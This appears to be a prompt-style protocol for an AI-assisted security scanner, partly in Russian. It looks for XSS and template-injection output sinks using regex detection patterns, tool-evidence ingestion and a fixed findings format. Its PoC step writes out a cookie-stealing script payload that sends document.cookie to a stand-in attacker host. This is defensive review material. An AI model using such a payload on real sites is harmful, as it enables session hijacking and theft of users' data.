<DEEP_SCAN_V3>
@ID: DATA_RENDERING_OUTPUT_SINKS
@GOAL: DETECT_INSECURE_DATA_EXPOSURE_LEADING_TO_XSS_OR_SSTI
@PARENT_CONTEXT: entry_points.protocol, validation_chokepoints.protocol

<GLOBAL_VARS>
HTML_SINKS: {
  "BROWSER_JS": "(\.innerHTML|\.outerHTML|document\.write)",
  "REACT": "(dangerouslySetInnerHTML)",
  "JINJA2": "(\{\{\s*.*|safe\s*\}\})"
}
</GLOBAL_VARS>

<EXECUTION_PIPELINE>
1. OUTPUT_INTERFACE_DISCOVERY: Найти все методы вывода (res.send, render).
2. CONTEXT_AWARE_TRACE: Отследить путь данных от ввода до рендеринга.
3. AUTO_ESCAPE_AUDIT: Проверить, не отключено ли экранирование (фильтр `|safe` или `{{{ }}}`).
4. SCENARIO_GENERATION: Сформировать PoC (например, `<script>fetch('http://attacker.com?c='+document.cookie)</script>`).

   - HYBRID_ANALYSIS: Read JSON artifacts (syft.json, grype.json, kics.json) from .security_review/artifacts/raw_tools_output/. Treat these results as 'Hard Evidence'. Perform AI Reachability Analysis to verify if the vulnerable component is reachable from the code. If confirmed, elevate the finding status to BLOCKER.
</EXECUTION_PIPELINE>

<OUTPUT_SPEC>
# ФОРМАТ ДЛЯ АВТОМАТИЧЕСКОГО ПАРСИНГА БЭКЕНДОМ
🚨 FINDING [data_rendering_output]:
FILE: [PATH]
LINE: [NUM]
CODE: [OUTPUT_SNIPPET]
DESCRIPTION: [Tool_Name] found [Vulnerability_ID]. AI Analysis confirmed that the vulnerable path is active in the current code flow via [Function_Name].
SCENARIO_OF_ATTACK: Attacker injects a malicious script into [FIELD]. When another user views the page, the script executes in their browser, potentially stealing session cookies (Session Hijacking) or redirecting the user to a malicious site.
@ANALYTICS_DATA: {"domain": "DATA_SAFETY", "impact": 0.8}
VISUALIZE: "Image of a Cross-Site Scripting (XSS) attack flow."
</OUTPUT_SPEC>
</DEEP_SCAN_V3>